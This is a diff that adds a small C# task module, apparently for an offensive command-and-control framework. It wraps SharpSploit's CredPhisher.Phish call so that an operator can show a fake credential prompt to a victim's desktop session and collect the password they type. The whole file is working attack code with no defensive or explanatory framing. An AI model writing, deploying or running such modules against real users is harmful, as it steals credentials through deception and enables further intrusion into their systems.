@@ -1,0 +1,14 @@
+using System;
+using SharpSploit.Credentials;
+
+public static class Task
+{
+    public static string Execute(string message)
+    {
+        try
+        {
+        	return CredPhisher.Phish(message);
+        }
+        catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+     }
+}
